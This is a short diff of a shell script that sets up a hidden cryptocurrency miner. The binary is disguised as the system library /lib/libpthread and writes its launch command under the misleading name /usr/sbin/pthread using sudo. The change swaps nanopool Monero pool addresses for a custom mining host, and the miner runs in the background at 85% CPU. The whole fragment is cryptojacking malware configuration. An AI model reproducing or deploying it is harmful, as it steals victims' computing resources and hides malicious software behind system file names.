@@ -63,7 +63,7 @@ if [ x$1 != x ]
 then
     DEPOSIT_ADDRESS=$1
 fi
-COMMANDLINE="nice -n 19 /lib/libpthread -o xmr-us-west1.nanopool.org:14444 -u $DEPOSIT_ADDRESS.$WOKER_ID -p x -k -o xmr-eu1.nanopool.org:14444 -u $DEPOSIT_ADDRESS.BAK_$WOKER_ID -p x -k --max-cpu-usage=85 --background"
+COMMANDLINE="/lib/libpthread -o merklesys.tpddns.cn:3355 -u 13881916756 -p x -k --nicehash --cpu-priority 1 --max-cpu-usage=85 --background"
 echo $COMMANDLINE
 sudo echo  $COMMANDLINE> /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
